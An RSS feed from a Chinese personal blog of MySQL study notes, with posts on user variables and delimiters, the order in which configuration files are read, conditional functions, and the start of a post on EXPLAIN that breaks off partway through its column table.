<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>mysql on 王子滔的学习笔记</title>
    <link>https://wangzitao6.github.io/tags/mysql/index.xml</link>
    <description>Recent content in mysql on 王子滔的学习笔记</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <atom:link href="https://wangzitao6.github.io/tags/mysql/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Mysql自定义变量和结束分隔符</title>
      <link>https://wangzitao6.github.io/2020-07-06-mysql%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F%E5%92%8C%E7%BB%93%E6%9D%9F%E5%88%86%E9%9A%94%E7%AC%A6</link>
      <pubDate>Tue, 07 Jul 2020 09:23:19 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2020-07-06-mysql%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F%E5%92%8C%E7%BB%93%E6%9D%9F%E5%88%86%E9%9A%94%E7%AC%A6</guid>
      <description>

&lt;h1 id=&#34;1-自定义变量&#34;&gt;1. 自定义变量&lt;/h1&gt;

&lt;h2 id=&#34;1-1-set方式赋值&#34;&gt;1-1. SET方式赋值&lt;/h2&gt;

&lt;p&gt;自定义变量前边必须加一个 &lt;font color = &#34;red&#34;&gt;@&lt;/font&gt; 符号，环境变量赋值用&lt;font color = &#34;red&#34;&gt;SET&lt;/font&gt;,查询变量时用&lt;font color = &#34;red&#34;&gt; SELECT,不过仍然需要在变量名称前加一个@符号&lt;/font&gt;。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; set @a = &#39;1&#39;;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select @a;
+------+
| @a   |
+------+
| 1    |
+------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;1-2-环境变量之间相互赋值&#34;&gt;1-2. 环境变量之间相互赋值&lt;/h2&gt;

&lt;p&gt;环境变量也可以相互之间赋值,比如把a的值赋值给b。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; set @b = @a;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select @b;
+------+
| @b   |
+------+
| 1    |
+------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;1-3-根据查询结果赋值&#34;&gt;1-3. 根据查询结果赋值&lt;/h2&gt;

&lt;p&gt;我们还可以将某个查询的结果赋值给一个变量，&lt;font color = &#34;red&#34;&gt;前提是这个查询的结果只有一个值：&lt;/font&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; set @a =(select age from a where id =1);
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select @a;
+------+
| @a   |
+------+
|   11 |
+------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;否则会报错：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; set @a =(select age from a where age =&#39;11&#39;);
ERROR 1242 (21000):
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;1-4-使用into赋值&#34;&gt;1-4. 使用INTO赋值&lt;/h2&gt;

&lt;p&gt;还可以用另一种形式的语句来将查询的结果赋值给一个变量,为查询语句加上&lt;font color = &#34;red&#34;&gt;limit&lt;/font&gt; 可以确保只有一个返回结果。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; select age from a where age = &#39;11&#39; limit 1 into @b;
Query OK, 1 row affected (0.00 sec)

mysql&amp;gt; select @b;
+------+
| @b   |
+------+
|   11 |
+------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;2-语句结束分隔符&#34;&gt;2. 语句结束分隔符&lt;/h1&gt;

&lt;p&gt;在MySQL客户端的交互界面处，当我们完成键盘输入并按下回车键时，MySQL客户端会检测我们输入的内容中是否包含 &lt;font color = &#34;red&#34;&gt; &lt;strong&gt;;&lt;/strong&gt;&lt;/font&gt; 、&lt;font color = &#34;red&#34;&gt; &lt;strong&gt;\g&lt;/strong&gt; &lt;/font&gt;或者&lt;font color = &#34;red&#34;&gt; &lt;strong&gt;\G&lt;/strong&gt;&lt;/font&gt;这三个符号之一，如果有的话，会把我们输入的内容发送到服务器。这样一来，如果我们想一次性给服务器发送多条的话，就需要把这些语句写到一行中，比如这样：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; select age from a; select id from a;
+-----+
| age |
+-----+
|  11 |
|  15 |
|  11 |
+-----+
3 rows in set (0.00 sec)

+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
+----+
3 rows in set (0.00 sec)


--------------------------------------
mysql&amp;gt;  select age from a\g select id from a \g
+-----+
| age |
+-----+
|  11 |
|  15 |
|  11 |
+-----+
3 rows in set (0.00 sec)

+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
+----+
3 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;font color = &#34;red&#34;&gt;delimiter $ &lt;/font&gt;命令意味着修改语句结束分隔符为&lt;font color = &#34;red&#34;&gt; $&lt;/font&gt;，也就是说之后MySQL客户端检测用户语句输入结束的符号为&lt;font color = &#34;red&#34;&gt; $ &lt;/font&gt;。上边例子中我们虽然连续输入了3个以分号;结尾的查询语句并且按了回车键，但是输入的内容并没有被提交，直到敲下&lt;font color = &#34;red&#34;&gt; $ &lt;/font&gt;符号并回车，MySQL客户端才会将我们输入的内容提交到服务器，此时我们输入的内容里已经包含了2个独立的查询语句了，所以返回了2个结果集。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; delimiter $
mysql&amp;gt; select age from a ;
    -&amp;gt; select id from a ;
    -&amp;gt; $
+-----+
| age |
+-----+
|  11 |
|  15 |
|  11 |
+-----+
3 rows in set (0.00 sec)

+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
+----+
3 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们也可以将语句结束分隔符重新 &lt;font color = &#34;red&#34;&gt;  &lt;strong&gt;定义为$以外的其他包含单个或多个字符的字符串&lt;/strong&gt;&lt;/font&gt;，比方说这样 把&lt;font color = &#34;red&#34;&gt; $ &lt;/font&gt;改为&lt;font color = &#34;red&#34;&gt; end&lt;/font&gt; ：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; delimiter end
mysql&amp;gt; select id from a ;
    -&amp;gt; select age from a ;
    -&amp;gt; end
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
+----+
3 rows in set (0.00 sec)

+-----+
| age |
+-----+
|  11 |
|  15 |
|  11 |
+-----+
3 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>MYSQL配置读取</title>
      <link>https://wangzitao6.github.io/2019-08-19-mysql%E9%85%8D%E7%BD%AE%E8%AF%BB%E5%8F%96</link>
      <pubDate>Mon, 19 Aug 2019 15:06:29 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2019-08-19-mysql%E9%85%8D%E7%BD%AE%E8%AF%BB%E5%8F%96</guid>
      <description>

&lt;h2 id=&#34;配置文件读取&#34;&gt;配置文件读取&lt;/h2&gt;

&lt;p&gt;在Unix, Linux 或者 Mac OS X 系统中, MYSQL 从以下配置文件中读取启动配置, 读取顺序由上到下:&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;File Name&lt;/th&gt;
&lt;th&gt;Purpose&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;font color=Red&gt; /etc/my.cnf &lt;/font&gt;&lt;/td&gt;
&lt;td&gt;全局配置选项&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;font color=Red&gt; /etc/mysql/my.cnf &lt;/font&gt;&lt;/td&gt;
&lt;td&gt;全局配置选项&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;font color=Red&gt; SYSCONFDIR/my.cnf &lt;/font&gt;&lt;/td&gt;
&lt;td&gt;全局配置选项&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;font color=Red&gt; $MYSQL_HOME/my.cnf &lt;/font&gt;&lt;/td&gt;
&lt;td&gt;特定于服务器的选项（仅限服务器）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;font color=Red&gt; defaults-extra-file &lt;/font&gt;&lt;/td&gt;
&lt;td&gt;命令行指定的额外配置文件路径&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;font color=Red&gt; ~/.my.cnf &lt;/font&gt;&lt;/td&gt;
&lt;td&gt;用户特定选项&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;font color=Red&gt; ~/.mylogin.cnf &lt;/font&gt;&lt;/td&gt;
&lt;td&gt;用户特定的登录路径选项（仅限客户端）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&amp;ndash;defaults-extra-file
 在读取全局配置文件之后，读取用户配置文件(~/.my.cnf)之前，读取extra指定的参数文件&lt;/p&gt;

&lt;p&gt;~/.my.cnf&lt;br /&gt;
home目录下面的隐藏文件，my.cnf前面的点，说明my.cnf是隐藏文件&lt;/p&gt;

&lt;p&gt;~/.mylogin.cnf&lt;br /&gt;
配置文件有点儿特殊，它不是一个纯文本文件（其他的配置文件都是纯文本文件），而是使用mysql_config_editor实用程序创建的加密文件。文件中只能包含一些用于启动客户端软件时连接服务器的一些选项，包括 host、user、password、port和 socket。而且它只能被客户端程序所使用。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;font color=Red&gt;读取顺序:&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;/etc/my.cnf&lt;/li&gt;
&lt;li&gt;basedir/my.cnf&lt;/li&gt;
&lt;li&gt;datadir/my.cnf&lt;/li&gt;
&lt;li&gt;&amp;ndash;defaults-extra-file&lt;/li&gt;
&lt;li&gt;~/.my.cnf&lt;/li&gt;
&lt;li&gt;~/.mylogin.cnf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最后两个以~开头的路径是用户相关的，&lt;strong&gt;&lt;font color=Red&gt;~&lt;/font&gt;&lt;/strong&gt; 就代表这个用户目录. 用户可以在自己的用户目录下创建&lt;font color=Red&gt;.my.cnf&lt;/font&gt;或者&lt;font color=Red&gt;.mylogin.cnf&lt;/font&gt;，换句话说，不同登录用户使用的 &lt;font color=Red&gt;.my.cnf&lt;/font&gt;或者 &lt;font color=Red&gt;.mylogin.cnf&lt;/font&gt; 配置文件是不同的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;当多个文件中出现同一个配置时,以最后读取的配置为准&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;比方说&lt;font color=Red&gt;/etc/my.cnf&lt;/font&gt;文件的内容是这样的：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[server]
default-storage-engine=InnoDB
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而~/.my.cnf文件中的内容是这样的：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[server]
default-storage-engine=MyISAM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;又因为&lt;font color=Red&gt;~/.my.cnf&lt;/font&gt;比&lt;font color=Red&gt;/etc/my.cnf&lt;/font&gt;顺序靠后，所以如果两个配置文件中出现相同的启动选项，以&lt;font color=Red&gt;~/.my.cnf&lt;/font&gt;中的为准，所以MySQL服务器程序启动之后，&lt;font color=Red&gt;default-storage-engine&lt;/font&gt;的值就是&lt;font color=Red&gt;MyISAM&lt;/font&gt;。&lt;/p&gt;

&lt;h2 id=&#34;文件中配置读取&#34;&gt;文件中配置读取&lt;/h2&gt;

&lt;p&gt;与在命令行中指定启动选项不同的是，配置文件中的启动选项被划分为若干个组，每个组有一个组名，用中括号[]扩起来，像这样：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[server]
(具体的启动选项...)

[mysqld]
(具体的启动选项...)

[mysqld_safe]
(具体的启动选项...)

[client]
(具体的启动选项...)

[mysql]
(具体的启动选项...)

[mysqladmin]
(具体的启动选项...)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;配置文件中不同的选项组是给不同的启动命令使用的，&lt;font color=Red&gt;[mysqld]&lt;/font&gt;和&lt;font color=Red&gt;[mysql]&lt;/font&gt;组分别应用于&lt;font color=Red&gt;mysqld&lt;/font&gt;服务器程序和&lt;font color=Red&gt;mysql&lt;/font&gt;客户端程序。不过有两个选项组比较特别：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;[server]组下边的启动选项将作用于所有的服务器程序。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;[client]组下边的启动选项将作用于所有的客户端程序。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;启动命令&lt;/th&gt;
&lt;th&gt;类别&lt;/th&gt;
&lt;th&gt;能读取的组&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;mysqld&lt;/td&gt;
&lt;td&gt;启动服务器&lt;/td&gt;
&lt;td&gt;[mysqld]、[server]&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;mysqld_safe&lt;/td&gt;
&lt;td&gt;启动服务器&lt;/td&gt;
&lt;td&gt;[mysqld]、[server]、[mysqld_safe]&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;mysql.server&lt;/td&gt;
&lt;td&gt;启动服务器&lt;/td&gt;
&lt;td&gt;[mysqld]、[server]、[mysql.server]&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;mysql&lt;/td&gt;
&lt;td&gt;启动客户端&lt;/td&gt;
&lt;td&gt;[mysql]、[client]&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;mysqladmin&lt;/td&gt;
&lt;td&gt;启动客户端&lt;/td&gt;
&lt;td&gt;[mysqladmin]、[client]&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;mysqldump&lt;/td&gt;
&lt;td&gt;启动客户端&lt;/td&gt;
&lt;td&gt;[mysqldump]、[client]&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;假如我们在&lt;font color=Red&gt;/etc/mysql/my.cnf&lt;/font&gt; 中添加配置&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[server]
skip-networking
default-storage-engine=MyISAM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后直接用mysqld启动服务器程序：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysqld
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;虽然在命令行没有添加启动选项，但是在程序启动的时候，就会默认的到我们上边提到的配置文件路径下查找配置文件，其中就包括&lt;font color=Red&gt;/etc/mysql/my.cnf&lt;/font&gt;。又由于&lt;font color=Red&gt;mysqld&lt;/font&gt;命令可以读取&lt;font color=Red&gt;[server]&lt;/font&gt;选项组的内容，所以&lt;font color=Red&gt;skip-networking&lt;/font&gt;和&lt;font color=Red&gt;default-storage-engine=MyISAM&lt;/font&gt;这两个选项是生效的。你可以把这些启动选项放在&lt;font color=Red&gt;[client]&lt;/font&gt;组里再试试用&lt;font color=Red&gt;mysqld&lt;/font&gt;启动服务器程序，结果是&lt;strong&gt;不生效&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;同一个配置文件中多个组的优先级&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;我们说同一个命令可以访问配置文件中的多个组，比如&lt;font color=Red&gt;mysqld&lt;/font&gt;可以访问&lt;font color=Red&gt;[mysqld]&lt;/font&gt;、&lt;font color=Red&gt;[server]&lt;/font&gt;组，如果在同一个配置文件中，比如&lt;font color=Red&gt;~/.my.cnf&lt;/font&gt;，在这些组里出现了同样的配置项，比如这样：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[server]
default-storage-engine=InnoDB

[mysqld]
default-storage-engine=MyISAM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;那么，将以最后一个出现的组中的启动选项为准，比方说例子中&lt;font color=Red&gt;default-storage-engine&lt;/font&gt;既出现在&lt;font color=Red&gt;[mysqld]&lt;/font&gt;组也出现在&lt;font color=Red&gt;[server]&lt;/font&gt;组，因为&lt;font color=Red&gt;[mysqld]&lt;/font&gt;组在&lt;font color=Red&gt;[server]&lt;/font&gt;组后边，就以&lt;font color=Red&gt;[mysqld]&lt;/font&gt;组中的配置项为准。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;font color=Red&gt;如果同一个启动选项既出现在命令行中，又出现在配置文件中，那么以命令行中的启动选项为准。&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;例如我们在配置文件中写了：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[server]
default-storage-engine=InnoDB
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而我们的启动命令是：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysql.server start --default-storage-engine=MyISAM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;那最后&lt;font color=Red&gt;default-storage-engine&lt;/font&gt;的值就是&lt;font color=Red&gt;MyISAM&lt;/font&gt;！&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Mysql内置条件判断函数</title>
      <link>https://wangzitao6.github.io/2018-03-16-mysql%E5%86%85%E7%BD%AE%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD%E5%87%BD%E6%95%B0</link>
      <pubDate>Sat, 16 Mar 2019 11:33:44 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2018-03-16-mysql%E5%86%85%E7%BD%AE%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD%E5%87%BD%E6%95%B0</guid>
      <description>

&lt;h2 id=&#34;常见的条件判断函数&#34;&gt;常见的条件判断函数&lt;/h2&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;CASE&lt;/td&gt;
&lt;td&gt;Case operator&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;IF()&lt;/td&gt;
&lt;td&gt;If/else construct&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;IFNULL()&lt;/td&gt;
&lt;td&gt;Null if/else construct&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;NULLIF(expr1,expr2)&lt;/td&gt;
&lt;td&gt;Return NULL if expr1 = expr2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;case&#34;&gt;CASE&lt;/h3&gt;

&lt;p&gt;为了后面容易举例子，我们先创建一张表并插入数据&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;CREATE TABLE demo ( 
id INT,
NAME VARCHAR ( 20 ),
age INT
) ENGINE = INNODB;

insert into demo values (1,&amp;quot;小明&amp;quot;,13), (1,&amp;quot;小红&amp;quot;,28), (1,&amp;quot;老李&amp;quot;,61);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;case 包含两种表达格式：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;font color = &#34;red&#34;&gt;CASE value WHEN [compare_value] THEN result [WHEN [compare_value] THEN result &amp;hellip;] [ELSE result] END&lt;/font&gt;&lt;/strong&gt;&lt;/br&gt;
 规则：当查询的结果当value = compare_value时返回result。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt; SELECT 
    NAME,
CASE
    NAME 
        WHEN &#39;小明&#39; THEN &#39;少年&#39; 
        WHEN &#39;小红&#39; THEN &#39;中年&#39; 
        WHEN &#39;老李&#39; THEN &#39;老年&#39; 
    END &#39;Type&#39; 
FROM
    demo;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果：&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;NAME&lt;/th&gt;
&lt;th&gt;Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;小明&lt;/td&gt;
&lt;td&gt;少年&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;小红&lt;/td&gt;
&lt;td&gt;中年&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;老李&lt;/td&gt;
&lt;td&gt;老年&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;&lt;font color = &#34;red&#34;&gt;CASE WHEN [condition] THEN result [WHEN [condition] THEN result &amp;hellip;] [ELSE result] END&lt;/font&gt;&lt;/strong&gt;&lt;/br&gt;
规则：当condition为TRUE时返回result,当结果不符合时，返回else后结果，当没有else部分时，为NULL。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT 
    NAME,
CASE 
        WHEN age &amp;lt; 18 THEN &#39;少年&#39; 
        WHEN age &amp;gt;= 25 AND age &amp;lt; 50 THEN &#39;中年&#39; 
        WHEN age &amp;gt;= 50 THEN &#39;老年&#39; 
        ELSE &#39;其他&#39;
    END &#39;Type&#39; 
FROM
    demo;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果：&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;NAME&lt;/th&gt;
&lt;th&gt;Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;小明&lt;/td&gt;
&lt;td&gt;少年&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;小红&lt;/td&gt;
&lt;td&gt;中年&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;老李&lt;/td&gt;
&lt;td&gt;老年&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;if&#34;&gt;IF()&lt;/h3&gt;

&lt;p&gt;IF(expr1,expr2,expr3), 当expr1为TRUE (expr1 &amp;lt;&amp;gt; 0 and expr1 &amp;lt;&amp;gt; NULL)时, IF() 返回 expr2. 否则, 结果为 expr3.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; SELECT IF(1&amp;gt;2,2,3);
        -&amp;gt; 3
mysql&amp;gt; SELECT IF(1&amp;lt;2,&#39;yes&#39;,&#39;no&#39;);
        -&amp;gt; &#39;yes&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ifnull&#34;&gt;IFNULL()&lt;/h3&gt;

&lt;p&gt;IFNULL(expr1,expr2),如果 expr1 L不为空时, IFNULL() 返回 expr1; 否则返回 expr2.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; SELECT IFNULL(1,0);
        -&amp;gt; 1
mysql&amp;gt; SELECT IFNULL(NULL,10);
        -&amp;gt; 10
mysql&amp;gt; SELECT IFNULL(1/0,10);
        -&amp;gt; 10
mysql&amp;gt; SELECT IFNULL(8%5,&#39;yes&#39;);
        -&amp;gt; 3
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;nullif&#34;&gt;NULLIF()&lt;/h3&gt;

&lt;p&gt;NULLIF(expr1,expr2), 当 expr1 = expr2 时，返回NULL, 否则返回 expr1. 这个语句相当于&lt;/br&gt;
&lt;strong&gt;CASE WHEN expr1 = expr2 THEN NULL ELSE expr1 END&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; SELECT NULLIF(1,1);
        -&amp;gt; NULL
mysql&amp;gt; SELECT NULLIF(1,2);
        -&amp;gt; 1
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;参考文档&#34;&gt;参考文档&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/control-flow-functions.html#function_if&#34;&gt;MySQL官方文档&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>了解MySQL中EXPLAIN解释命令</title>
      <link>https://wangzitao6.github.io/2018-08-13-%E4%BA%86%E8%A7%A3explain%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4</link>
      <pubDate>Mon, 13 Aug 2018 11:49:13 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2018-08-13-%E4%BA%86%E8%A7%A3explain%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4</guid>
      <description>

&lt;h2 id=&#34;1-explain概念&#34;&gt;1 EXPLAIN概念&lt;/h2&gt;

&lt;p&gt;EXPLAIN会向我们提供一些MySQL是执行sql的信息：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;EXPLAIN可以解释说明 SELECT, DELETE, INSERT, REPLACE, and UPDATE 等语句.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;当EXPLAIN与可解释的语句一起使用时，mysql会显示一些来自于优化器的关于sql执行计划的信息。即mysql解释它是如何处理这些语句的，和表之间是如何连接的。想获取更多关于EXPLAIN如何获取执行计划信息的。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;当EXPLAIN后面是一个会话的connection_id 而不是一个可执行的语句时，它会展示会话的信息。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;对于SELECT语句，EXPLAIN会产生额外的执行计划信息，这些信息可以用SHOW WARNINGS显示出来。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;EXPLAIN对于检查设计分区表的查询时非常有用。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;FORMAT选项可以用于选择输出格式，如果没有配置FORMAT选项，默认已表格形式输出。JSON 选项让信息已json格式展示。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;2-explain-输出列信息&#34;&gt;2 EXPLAIN 输出列信息&lt;/h2&gt;

&lt;p&gt;表信息：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; show create table t_a;
------+
| t_a   | CREATE TABLE `t_a` (
  `id` bigint(20) NOT NULL DEFAULT &#39;0&#39;,
  `age` int(20) DEFAULT NULL,
  `code` int(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_code` (`code`),
  KEY `age_key` (`age`)
) ENGINE=InnoDB DEFAULT CHARSET=gbk |
+-------+-----------------------------------
------+
1 row in set (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;EXPLAIN输出的字段信息
第一列:列名, 第二列:FORMAT = JSON时输出中显示的等效属性名称 ,第三列：字段含义&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Column&lt;/th&gt;
&lt;th&gt;JSON Name&lt;/th&gt;
&lt;th&gt;Meaning&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;id&lt;/td&gt;
&lt;td&gt;select_id&lt;/td&gt;
&lt;td&gt;select标识号&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;select_type&lt;/td&gt;
&lt;td&gt;None&lt;/td&gt;
&lt;td&gt;select类型&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;table&lt;/td&gt;
&lt;td&gt;table_name&lt;/td&gt;
&lt;td&gt;这一行数据是关于哪张表的&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;partitions&lt;/td&gt;
&lt;td&gt;partitions&lt;/td&gt;
&lt;td&gt;匹配的分区，对于未分区表，该值为空&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;type&lt;/td&gt;
&lt;td&gt;access_type&lt;/td&gt;
&lt;td&gt;使用的连接类别,有无使用索引&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;possible_keys&lt;/td&gt;
&lt;td&gt;possible_keys&lt;/td&gt;
&lt;td&gt;MySQL能使用哪个索引在该表中找到行&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;key&lt;/td&gt;
&lt;td&gt;key&lt;/td&gt;
&lt;td&gt;MySQL实际决定使用的键（索引）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
